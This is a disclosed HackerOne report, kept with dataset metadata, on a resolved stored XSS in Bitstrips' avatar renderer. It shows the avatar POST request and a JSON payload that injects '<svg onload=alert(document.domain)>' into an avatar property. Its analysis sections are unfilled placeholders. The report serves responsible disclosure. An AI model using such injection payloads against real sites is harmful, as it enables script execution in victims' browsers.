---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159878'
original_report_id: '159878'
title: '[render.bitstrips.com] Stored XSS via an incorrect avatar property value'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: snapchat
created_at: '2016-08-16T23:25:17.572Z'
disclosed_at: '2017-01-04T08:38:41.609Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 21
asset_identifier: www.bitstrips.com
asset_type: URL
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# [render.bitstrips.com] Stored XSS via an incorrect avatar property value

## Metadata

- HackerOne Report ID: 159878
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: snapchat
- Disclosed At: 2017-01-04T08:38:41.609Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

While modifying an avatar, an attacker has the opportunity to submit XSS payloads as its property values. The resulting png file will return a 500 error with the payload in the response body. The response has a **text/html** content type, which makes the XSS attack possible.

**PoC:**

1. Go to https://www.bitmoji.com/account/ and create a new account
2. Choose the avatar style and save it. The following POST request will be sent:

> POST /user/avatar?styles=1,4&app_id=13 HTTP/1.1
> Host: api.bitmoji.com
> 
> avatar_id=%id%&char_data=%data%

3\. Modify the **data** value: set any **pd2** object property value (for example, **jaw**) to **<svg onload=alert(document.domain)>**:

```
{"colours":{},"pd2":{"cranium":"cranium_midstraightmale","forehead":"forehead_standard","hair_back":"hair_back_midstraightmale","hair_front":"hair_front_midstraightmale","hairbottom":"hairbottom_blank","detail_L2_L":"_blank","detail_L2_R":"_blank","jaw":"<svg onload=alert(document.domain)>","beard":"_blank","stachin":"_blank","stachout":"_blank"},"body":{},"style":1}
```

and submit the request again.

4\. Go to your account and click "Edit yor avatar". In your browser web console you will see a https://render.bitstrips.com/render/***/*.png link with a 500 error. Open this link.

The script will be executed.

A PoC link: https://render.bitstrips.com/render/6688424/173752531_2_s1-v1.png

I also recorded a video (see the attachment) of these steps, I hope it will help you reproduce the issue.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
